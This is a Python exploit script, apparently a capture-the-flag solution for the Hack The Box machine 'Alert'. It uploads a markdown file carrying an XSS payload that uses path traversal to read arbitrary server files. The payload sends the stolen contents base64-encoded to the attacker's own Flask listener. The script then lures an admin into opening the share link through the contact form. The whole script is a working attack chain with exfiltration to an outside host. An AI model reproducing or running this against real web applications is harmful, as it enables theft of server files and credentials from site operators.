#!/usr/bin/env python3

import requests

from flask import Flask, request
from pwn import b64d, logging, os, re, sys, Thread


URL = 'http://alert.htb'
IP = sys.argv[1]
PORT = 5000
filename = sys.argv[2]

logging.getLogger('werkzeug').disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *_: None

app = Flask(__name__)


@app.route('/')
def index():
    print(b64d(request.query_string[2:]).decode('latin1')[5:-8])
    os._exit(0)


Thread(target=app.run, kwargs={'port': PORT, 'host': IP}).start()

markdown = f'''<img onerror="fetch('{URL}/messages.php?file=../../../..{filename}').then(r => r.text()).then(r => fetch('http://{IP}:{PORT}/?c=' + btoa(r)))" src="x">'''

r = requests.post(f'{URL}/visualizer.php', files={'file': ('test.md', markdown, 'text/x-markdown')})
link = re.findall(r'<a class="share-button" href="(.*?)" target="_blank">Share Markdown</a>', r.text)[0]

requests.post(f'{URL}/contact.php', data={'email': 'asdf@asdf.com', 'message': link})
